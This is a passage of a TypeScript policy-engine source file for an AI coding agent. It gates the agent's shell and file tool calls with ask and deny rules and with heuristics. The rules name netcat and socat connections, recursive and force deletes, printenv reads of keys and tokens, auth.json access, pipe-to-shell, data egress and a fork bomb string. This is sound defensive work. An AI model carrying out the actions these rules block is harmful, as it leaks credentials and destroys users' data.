    { tool: "bash", exec: "rsync", action: "ask", label: "rsync transfer" },

    // Raw sockets
    { tool: "bash", exec: "nc", action: "ask", label: "Netcat connection" },
    { tool: "bash", exec: "ncat", action: "ask", label: "Netcat connection" },
    { tool: "bash", exec: "socat", action: "ask", label: "Socket relay" },

    // ── Destructive operations → ask ──
    // These can damage bind-mounted workspace data

    // rm with force/recursive flags
    {
      tool: "bash",
      exec: "rm",
      pattern: "rm *-*r*",
      action: "ask",
      label: "Recursive delete",
    },
    {
      tool: "bash",
      exec: "rm",
      pattern: "rm *-*f*",
      action: "ask",
      label: "Force delete",
    },

    // Git destructive operations
    {
      tool: "bash",
      exec: "git",
      pattern: "git push*--force*",
      action: "ask",
      label: "Force push",
    },
    {
      tool: "bash",
      exec: "git",
      pattern: "git push*-f*",
      action: "ask",
      label: "Force push",
    },
    {
      tool: "bash",
      exec: "git",
      pattern: "git reset --hard*",
      action: "ask",
      label: "Hard reset",
    },
    {
      tool: "bash",
      exec: "git",
      pattern: "git clean*-*f*",
      action: "ask",
      label: "Git clean",
    },
  ],
  // Legacy preset default behavior
  defaultAction: "allow",
  heuristics: DEFAULT_HEURISTICS,
};

const HOST_HARD_DENY: PolicyRule[] = [
  // Credential exfiltration
  {
    tool: "bash",
    pattern: "*auth.json*",
    action: "deny",
    label: "Protect API keys",
  },
  {
    tool: "read",
    pattern: "**/agent/auth.json",
    action: "deny",
    label: "Protect API keys",
  },
  {
    tool: "bash",
    pattern: "*printenv*_KEY*",
    action: "deny",
    label: "Protect env secrets",
  },
  {
    tool: "bash",
    pattern: "*printenv*_SECRET*",
    action: "deny",
    label: "Protect env secrets",
  },
  {
    tool: "bash",
    pattern: "*printenv*_TOKEN*",
    action: "deny",
    label: "Protect env secrets",
  },

  // Fork bomb
  {
    tool: "bash",
    pattern: "*:(){ :|:& };*",
    action: "deny",
    label: "Fork bomb",
  },
];

const HOST_EXTERNAL_ASK_RULES: PolicyRule[] = [
  // ── Destructive local operations → ask ──
  // Irreversible actions that can damage local data.

  // rm with force/recursive flags
  {
    tool: "bash",
    exec: "rm",
    pattern: "rm *-*r*",
    action: "ask",
    label: "Recursive delete",
  },
  {
    tool: "bash",
    exec: "rm",
    pattern: "rm *-*f*",
    action: "ask",
    label: "Force delete",
  },

  // ── External actions → ask ──
  // Only gate things that act on the user's behalf on external systems.

  // Git push (writes to remotes)
  {
    tool: "bash",
    exec: "git",
    pattern: "git push*",
    action: "ask",
    label: "Git push",
  },

  // Package publishing
  {
    tool: "bash",
    exec: "npm",
    pattern: "npm publish*",
    action: "ask",
    label: "npm publish",
  },
  {
    tool: "bash",
    exec: "yarn",
    pattern: "yarn publish*",
    action: "ask",
    label: "yarn publish",
  },
  {
    tool: "bash",
    exec: "twine",
    pattern: "twine upload*",
    action: "ask",
    label: "PyPI upload",
  },

  // Remote access
  { tool: "bash", exec: "ssh", action: "ask", label: "SSH connection" },
  { tool: "bash", exec: "scp", action: "ask", label: "SCP transfer" },
  { tool: "bash", exec: "sftp", action: "ask", label: "SFTP transfer" },

  // Raw sockets (can exfiltrate data to arbitrary endpoints)
  { tool: "bash", exec: "nc", action: "ask", label: "Netcat connection" },
  { tool: "bash", exec: "ncat", action: "ask", label: "Netcat connection" },
  { tool: "bash", exec: "socat", action: "ask", label: "Socket relay" },
  { tool: "bash", exec: "telnet", action: "ask", label: "Telnet connection" },

  // Local machine control flows (explicit approval required)
  {
    tool: "bash",
    pattern: "*scripts/build-install.sh*",
    action: "ask",
    label: "Reinstall iOS app",
  },
  {
    tool: "bash",
    exec: "xcrun",
    pattern: "xcrun devicectl device install app*",
    action: "ask",
    label: "Install app on physical device",
  },
  {
    tool: "bash",
    pattern: "*scripts/ios-dev-up.sh*",
    action: "ask",
    label: "Restart oppi-server server and deploy app",
  },
  {
    tool: "bash",
    exec: "npx",
    pattern: "npx tsx src/cli.ts serve*",
    action: "ask",
    label: "Start/restart oppi-server server",
  },
  {
    tool: "bash",
    exec: "tsx",
    pattern: "tsx src/cli.ts serve*",
    action: "ask",
    label: "Start/restart oppi-server server",
  },
];

/**
 * Default local policy mode (developer trust).
 *
 * Philosophy: behave like pi CLI. Tools are mostly free-flowing.
 * The gate asks only for external/high-impact actions and denies secret exfil.
 */
const BUILTIN_HOST_POLICY: CompiledPolicy = {
  name: "default",
  hardDeny: HOST_HARD_DENY,
  rules: HOST_EXTERNAL_ASK_RULES,
  defaultAction: "allow",
  heuristics: DEFAULT_HEURISTICS,
};

function resolveBuiltInPolicy(mode: string): CompiledPolicy | undefined {
  switch (mode) {
    case "default":
      return BUILTIN_HOST_POLICY;
    case "container":
      return BUILTIN_CONTAINER_POLICY;
    case "host":
      return BUILTIN_HOST_POLICY;
    default:
      return undefined;
  }
}

function mapDecisionToAction(decision: "allow" | "ask" | "block"): PolicyAction {
  if (decision === "block") return "deny";
  return decision;
}

function mapPermissionToRule(permission: DeclarativePolicyPermission): PolicyRule {
  const match = permission.match;

  return {
    tool: match.tool,
    exec: match.executable,
    pattern: match.commandMatches || match.pathMatches,
    pathWithin: match.pathWithin,
    domain: match.domain,
    action: mapDecisionToAction(permission.decision),
    label: permission.label || permission.reason,
  };
}

function resolveHeuristics(h?: import("./types.js").PolicyHeuristics): ResolvedHeuristics {
  if (!h) return { ...DEFAULT_HEURISTICS };
  return {
    pipeToShell: h.pipeToShell === false ? false : mapDecisionToAction(h.pipeToShell || "ask"),
    dataEgress: h.dataEgress === false ? false : mapDecisionToAction(h.dataEgress || "ask"),
    secretEnvInUrl:
      h.secretEnvInUrl === false ? false : mapDecisionToAction(h.secretEnvInUrl || "ask"),
    secretFileAccess:
      h.secretFileAccess === false ? false : mapDecisionToAction(h.secretFileAccess || "block"),
  };
}

function compileDeclarativePolicy(policy: DeclarativePolicyConfig): CompiledPolicy {
  return {
    name: policy.mode || "declarative",
    hardDeny: policy.guardrails
      .filter((rule) => rule.immutable || rule.decision === "block")
      .map(mapPermissionToRule)
      .map((rule) => ({ ...rule, action: "deny" as const })),
    rules: policy.permissions.map(mapPermissionToRule),
    defaultAction: mapDecisionToAction(policy.fallback),
    heuristics: resolveHeuristics(policy.heuristics),
  };
}

// ─── Per-Session Config ───

export interface PathAccess {
  path: string; // Directory path (resolved, no ~ )
  access: "read" | "readwrite";
}

/**
 * Per-session policy configuration, derived from workspace settings.
 * Controls which directories are accessible and at what level.
 */
export interface PolicyConfig {
  /** Directories the session may access. Order doesn't matter. */
  allowedPaths: PathAccess[];

  /**
   * Extra executables to auto-allow for this workspace.
   * Use for dev runtimes (node, python3, make, cargo, etc.) that need
   * to run in a specific workspace but CAN execute arbitrary code.
   *
   * These are NOT in the global read-only list because they're code executors.
   * A workspace for a Node.js project might add ["node", "npx", "npm"].
   * A workspace for a Python project might add ["python3", "uv", "pip"].
   */
  allowedExecutables?: string[];
}

// ─── Policy Engine ───

export class PolicyEngine {
  private policy: CompiledPolicy;
  private config: PolicyConfig;

  constructor(policyOrMode: string | DeclarativePolicyConfig = "default", config?: PolicyConfig) {
    if (typeof policyOrMode === "string") {
      // Legacy string modes — resolve to built-in compiled policy for test compat.
      // Production always passes DeclarativePolicyConfig from JSON.
      const builtInPolicy = resolveBuiltInPolicy(policyOrMode);
      if (!builtInPolicy) {
        // Unknown mode: fall back to compiling the default policy config
        this.policy = compileDeclarativePolicy(defaultPolicy());
      } else {
        this.policy = builtInPolicy;
      }
    } else {
      this.policy = compileDeclarativePolicy(policyOrMode);
    }

    this.config = config || { allowedPaths: [] };
  }

  /**
   * Evaluate a tool call against the policy.
   *
   * Layered evaluation:
   * 1. Hard denies (immutable — credential exfiltration, privilege escalation)
   * 2. Rules (destructive operations on workspace data)
   * 3. Default action (allow for built-in presets)
   *
   * Pipes and subshells are NOT auto-escalated. Read-only command composition
   * like `grep foo | wc -l` should not require phone approval.
   */
  evaluate(req: GateRequest): PolicyDecision {
    const { tool, input } = req;

    // Layer 1: Hard denies (immutable)
    for (const rule of this.policy.hardDeny) {
      if (this.matchesRule(rule, tool, input)) {
        return {
          action: "deny",
          reason: rule.label || "Blocked by hard deny rule",
          layer: "hard_deny",
          ruleLabel: rule.label,
        };
      }
    }

    // Layer 1.1: Secret file access heuristic (configurable)
    if (this.policy.heuristics.secretFileAccess !== false) {
      const secretDeny = this.evaluateSecretFileAccess(tool, input);
      if (secretDeny) {
        secretDeny.action = this.policy.heuristics.secretFileAccess;
        return secretDeny;
      }
    }

    // Layer 1.5: Structural heuristics (configurable via policy.heuristics)
    if (tool === "bash") {
      const command = (input as { command?: string }).command || "";
      const segments = splitBashCommandChain(command);

      for (const segment of segments) {
        // Pipe to shell
        if (this.policy.heuristics.pipeToShell !== false && /\|\s*(ba)?sh\b/.test(segment)) {
          return {
            action: this.policy.heuristics.pipeToShell,
            reason: "Pipe to shell (arbitrary code execution)",
            layer: "rule",
            ruleLabel: "Pipe to shell",
          };
        }

        const stages = splitPipelineStages(segment);
        for (const stage of stages) {
          const parsed = parseBashCommand(stage);

          // Data egress
          if (this.policy.heuristics.dataEgress !== false && isDataEgress(parsed)) {
            return {
              action: this.policy.heuristics.dataEgress,
              reason: "Outbound data transfer",
              layer: "rule",
              ruleLabel: "Data egress",
            };
          }

          // Secret env expansion in URLs
          if (
            this.policy.heuristics.secretEnvInUrl !== false &&
            hasSecretEnvExpansionInUrl(parsed)
          ) {
            return {
              action: this.policy.heuristics.secretEnvInUrl,
              reason: "Possible secret env exfiltration in URL",
              layer: "rule",
              ruleLabel: "Secret env expansion in URL",
            };
          }
        }
      }
    }

    // Layer 2: Rules (external actions, destructive operations)
    for (const rule of this.policy.rules) {
      if (this.matchesRule(rule, tool, input)) {
        return {
          action: rule.action,
          reason: rule.label || `Matched rule for ${tool}`,
          layer: "rule",
          ruleLabel: rule.label,
        };
      }
    }

    // Layer 3: Default
    return {
      action: this.policy.defaultAction,
      reason: "No matching rule — using default",
      layer: "default",
    };
  }

  /**
   * Get a human-readable summary of a tool call for display on phone.
   */
  formatDisplaySummary(req: GateRequest): string {
    const { tool, input } = req;

    switch (tool) {
      case "bash": {
        const command = (input as { command?: string }).command || "";
        return command || "bash (unknown command)";
      }
      case "read":
        return `Read ${(input as { path?: string }).path || "unknown file"}`;
      case "write":
        return `Write ${(input as { path?: string }).path || "unknown file"}`;
      case "edit":
        return `Edit ${(input as { path?: string }).path || "unknown file"}`;
      case "grep":
        return `Grep for "${(input as { pattern?: string }).pattern || "?"}"`;
      case "find":
        return `Find in ${(input as { path?: string }).path || "."}`;
      case "ls":
        return `List ${(input as { path?: string }).path || "."}`;
      default:
        return `${tool}(${JSON.stringify(input).slice(0, 100)})`;
    }
  }

  // ─── Rule-based evaluation ───

  /**
   * Evaluate a tool call with unified user rules.
   *
   * Layered evaluation:
   *   1. Reserved guards (policy.* tools always ask)
   *   2. Heuristics (structural detection)
   *   3. User rules (deny wins, then most specific non-deny)
   *   4. Read-only bash auto-allow (when no rule matches)
   *   5. Default policy fallback
   */
  evaluateWithRules(
    req: GateRequest,
    rules: Rule[],
    sessionId: string,
    workspaceId: string,
  ): PolicyDecision {
    if (req.tool.startsWith("policy.")) {
      return {
        action: "ask",
        reason: "Policy changes always require approval",
        layer: "rule",
        ruleLabel: "policy guard",
      };
    }

    const heuristicDecision = this.evaluateHeuristics(req);
    if (heuristicDecision) {
      return heuristicDecision;
    }

    const parsed = this.parseRequestContext(req);
    const applicable = rules.filter((rule) => this.isRuleApplicable(rule, sessionId, workspaceId));
    const matching = applicable.filter((rule) => this.matchesUserRule(rule, req, parsed));

    if (matching.length === 0) {
      const readOnlyAllow = this.evaluateReadOnlyShellInspection(req);
      if (readOnlyAllow) {
        return readOnlyAllow;
      }

      return {
        action: this.policy.defaultAction,
        reason: `No matching rule — using default ${this.policy.defaultAction}`,
        layer: "default",
      };
    }

    const denyMatches = matching.filter((rule) => rule.decision === "deny");
    if (denyMatches.length > 0) {
      const best = this.pickMostSpecificRule(denyMatches, parsed);
      return {
        action: "deny",
        reason: best.label || "Denied by rule",
        layer: this.layerForScope(best.scope),
        ruleLabel: best.label,
        ruleId: best.id,
      };
    }

    const best = this.pickMostSpecificRule(matching, parsed);
    return {
      action: best.decision,
      reason: best.label || `Matched ${best.scope} rule`,
      layer: this.layerForScope(best.scope),
      ruleLabel: best.label,
      ruleId: best.id,
    };
  }

  private evaluateHeuristics(req: GateRequest): PolicyDecision | null {
    const { tool, input } = req;

    if (this.policy.heuristics.secretFileAccess !== false) {
      const secretDeny = this.evaluateSecretFileAccess(tool, input);
      if (secretDeny) {
        secretDeny.action = this.policy.heuristics.secretFileAccess;
        return secretDeny;
      }
    }

    if (tool === "bash") {
      const command = (input as { command?: string }).command || "";
      const segments = splitBashCommandChain(command);

      for (const segment of segments) {
        if (this.policy.heuristics.pipeToShell !== false && /\|\s*(ba)?sh\b/.test(segment)) {
          return {
            action: this.policy.heuristics.pipeToShell,
            reason: "Pipe to shell (arbitrary code execution)",
            layer: "rule",
            ruleLabel: "Pipe to shell",
          };
        }

        const stages = splitPipelineStages(segment);
        for (const stage of stages) {
          const parsed = parseBashCommand(stage);

          if (this.policy.heuristics.dataEgress !== false && isDataEgress(parsed)) {
            return {
              action: this.policy.heuristics.dataEgress,
              reason: "Outbound data transfer",
              layer: "rule",
              ruleLabel: "Data egress",
            };
          }

          if (
            this.policy.heuristics.secretEnvInUrl !== false &&
            hasSecretEnvExpansionInUrl(parsed)
          ) {
            return {
              action: this.policy.heuristics.secretEnvInUrl,
              reason: "Possible secret env exfiltration in URL",
              layer: "rule",
              ruleLabel: "Secret env expansion in URL",
            };
          }
        }
      }
    }

    return null;
  }

  private evaluateReadOnlyShellInspection(req: GateRequest): PolicyDecision | null {
    if (req.tool !== "bash") return null;

    const command = (req.input as { command?: string }).command || "";
    if (command.trim().length === 0) return null;

    const segments = splitBashCommandChain(command);
    let sawReadOnlyCommand = false;

    for (const segment of segments) {
      const trimmedSegment = segment.trim();
      if (!trimmedSegment || trimmedSegment.startsWith("#")) continue;

      const stages = splitPipelineStages(trimmedSegment);
      for (const stage of stages) {
        const parsed = parseBashCommand(stage);
        const execName = executableName(parsed.executable);

        if (!execName) continue;

        if (CHAIN_HELPER_EXECUTABLES.has(execName)) continue;

        if (parsed.hasRedirect || parsed.hasSubshell) {
          return null;
        }

        if (!READ_ONLY_INSPECTION_EXECUTABLES.has(execName)) {
          return null;
        }

        if (execName === "find" && parsed.args.some((arg) => FIND_MUTATING_FLAGS.has(arg))) {
          return null;
        }

        sawReadOnlyCommand = true;
      }
    }

    if (!sawReadOnlyCommand) {
      return null;
    }

    return {
      action: "allow",
      reason: "Read-only shell inspection",
      layer: "rule",
      ruleLabel: "Read-only shell inspection",
    };
  }

  // ─── Rule matching helpers ───

  private parseRequestContext(req: GateRequest): {
    executable?: string;
    pathRawNormalized?: string;
    pathResolved?: string;
    command?: string;
  } {
    const { tool, input } = req;

    if (tool === "bash") {
      const command = (input as { command?: string }).command || "";

      const segments = splitBashCommandChain(command);
      const parsedSegments = segments
        .map((segment) => parseBashCommand(segment))
        .filter((parsed) => parsed.executable.length > 0);

      const primary =
        parsedSegments.find(
          (parsed) => !CHAIN_HELPER_EXECUTABLES.has(executableName(parsed.executable)),
        ) || parsedSegments[0];

      const executable = primary ? executableName(primary.executable) : undefined;

      return { executable, command };
    }

    if (FILE_PATH_TOOLS.has(tool)) {
      const path = (input as { path?: string }).path;
      if (!path) return {};
      const normalized = normalizePathInput(path);
      return {
        pathRawNormalized: normalized.rawNormalized,
        pathResolved: normalized.resolvedRealpath,
      };
    }

    return {};
  }

  private isRuleApplicable(rule: Rule, sessionId: string, workspaceId: string): boolean {
    if (rule.expiresAt && rule.expiresAt < Date.now()) return false;

    if (rule.scope === "session") {
      return rule.sessionId === sessionId;
    }

    if (rule.scope === "workspace") {
      return rule.workspaceId === workspaceId;
    }

    return rule.scope === "global";
  }

  private matchesUserRule(
    rule: Rule,
    req: GateRequest,
    parsed: {
      executable?: string;
      pathRawNormalized?: string;
      pathResolved?: string;
      command?: string;
    },
  ): boolean {
    const { tool, input } = req;

    if (rule.tool !== "*" && rule.tool !== tool) {
      return false;
    }

    if (rule.executable) {
      if (!parsed.executable) return false;
      if (parsed.executable !== rule.executable) return false;
    }

    if (!rule.pattern) {
      return true;
    }

    if (tool === "bash") {
      const command = parsed.command || (input as { command?: string }).command || "";
      if (command.length === 0) return false;

      // Match bash glob patterns per chain segment so helper prefixes like
      // `cd repo && git commit ...` still match `git commit*` rules.
      const segments = splitBashCommandChain(command);
      return segments.some((segment) => matchBashPattern(segment, rule.pattern!));
    }

    if (FILE_PATH_TOOLS.has(tool)) {
      const candidates = [parsed.pathRawNormalized, parsed.pathResolved].filter(
        (value): value is string => Boolean(value && value.length > 0),
      );
      if (candidates.length === 0) return false;
      return candidates.some((path) => globMatch(path, rule.pattern!));
    }

    const serialized = JSON.stringify(input);
    return globMatch(serialized, rule.pattern);
  }

  private pickMostSpecificRule(
    rules: Rule[],
    _parsed: {
      executable?: string;
      pathRawNormalized?: string;
      pathResolved?: string;
      command?: string;
    },
  ): Rule {
    const withIndex = rules.map((rule, index) => ({ rule, index }));

    withIndex.sort((a, b) => {
      const aMatcher = matcherTypeRank(a.rule);
      const bMatcher = matcherTypeRank(b.rule);
      if (aMatcher !== bMatcher) return bMatcher - aMatcher;

      const aPrefix = a.rule.pattern ? literalPrefixLength(a.rule.pattern) : 0;
      const bPrefix = b.rule.pattern ? literalPrefixLength(b.rule.pattern) : 0;
      if (aPrefix !== bPrefix) return bPrefix - aPrefix;

      const aDecisionBias = a.rule.decision === "ask" ? 1 : 0;
      const bDecisionBias = b.rule.decision === "ask" ? 1 : 0;
      if (aDecisionBias !== bDecisionBias) return bDecisionBias - aDecisionBias;

      return a.index - b.index;
    });

    return withIndex[0].rule;
  }

  private layerForScope(scope: Rule["scope"]): PolicyDecision["layer"] {
    if (scope === "session") return "session_rule";
    if (scope === "workspace") return "workspace_rule";
    return "global_rule";
  }

  private evaluateSecretFileAccess(
    tool: string,
    input: Record<string, unknown>,
  ): PolicyDecision | null {
    if (tool === "read") {
      const path = (input as { path?: string }).path;
      if (path && isSecretPath(path)) {
        return {
          action: "deny",
          reason: "Blocked access to secret credential files",
          layer: "hard_deny",
          ruleLabel: "Protect secret files",
        };
      }
    }

    if (tool === "bash") {
      const command = (input as { command?: string }).command || "";
      const segments = splitBashCommandChain(command);

      for (const segment of segments) {
        // Check for secret file reads in pipeline stages
        const stages = splitPipelineStages(segment);
        for (const stage of stages) {
          const parsed = parseBashCommand(stage);
          if (isSecretFileRead(parsed)) {
            return {
              action: "deny",
              reason: "Blocked access to secret credential files",
              layer: "hard_deny",
              ruleLabel: "Protect secret files",
            };
          }
        }

        // Check for secret file references inside command substitutions
        if (hasSecretFileReference(segment)) {
          return {
            action: "deny",
            reason: "Blocked secret file access via command substitution",
            layer: "hard_deny",
            ruleLabel: "Protect secret files",
          };
        }
      }
    }

    return null;
  }

  getPolicyMode(): string {
    return this.policy.name;
  }

  // ─── Internal ───

  private matchesRule(rule: PolicyRule, tool: string, input: Record<string, unknown>): boolean {
    // Check tool name
    if (rule.tool && rule.tool !== "*" && rule.tool !== tool) {
      return false;
    }

    if (tool === "bash") {
      const command = (input as { command?: string }).command || "";

      const segments = splitBashCommandChain(command);

      for (const segment of segments) {
        if (this.matchesBashRuleSegment(rule, segment)) {
          return true;
        }
      }

      return false;
    }

    // exec field only applies to bash
    if (rule.exec) {
      return false;
    }

    // Check pattern against the match target.
    if (rule.pattern) {
      const target = this.getMatchTarget(tool, input);

      // For file-path tools (read, write, edit), glob match against path.
      if (!globMatch(target, rule.pattern)) {
        return false;
      }
    }

    // Check pathWithin (path confinement)
    if (rule.pathWithin) {
      const prefix = rule.pathWithin;
      const paths = this.extractPaths(tool, input);
      if (paths.length > 0) {
        const confined = paths.every((p) => p.startsWith(prefix));
        if (!confined) return false;
      }
    }

    return true;
  }

  private matchesBashRuleSegment(rule: PolicyRule, segment: string): boolean {
    if (rule.exec) {
      const parsed = parseBashCommand(segment);
      // Match both bare name ("sudo") and absolute path ("/usr/bin/sudo").
      // Extract basename from absolute paths for comparison.
      const execName = parsed.executable.includes("/")
        ? parsed.executable.split("/").pop() || parsed.executable
        : parsed.executable;
      if (execName !== rule.exec) {
        return false;
      }
    }

    if (rule.pattern) {
      // Bash commands are strings, not file paths. minimatch treats '/' as
      // a path separator so '*' won't cross it — 'rm *-*r*' fails to match
      // 'rm -rf /tmp/foo'. Use flat string glob matching.
      if (!matchBashPattern(segment, rule.pattern)) {
        return false;
      }
    }

    return true;
  }

  private getMatchTarget(tool: string, input: Record<string, unknown>): string {
    switch (tool) {
      case "bash":
        return (input as { command?: string }).command || "";
      case "grep":
        return (input as { pattern?: string }).pattern || "";
      case "read":
      case "write":
      case "edit":
      case "find":
      case "ls":
        return (input as { path?: string }).path || "";
      default:
        return JSON.stringify(input);
    }
  }

  private extractPaths(tool: string, input: Record<string, unknown>): string[] {
    switch (tool) {
      case "read":
      case "write":
      case "edit":
      case "find":
      case "ls": {
        const path = (input as { path?: string }).path;
        return path ? [path] : [];
      }
      case "bash":
        // Legacy evaluate() path skips path confinement on bash (covered by exec matching)
        return [];
      default:
        return [];
    }
  }
}
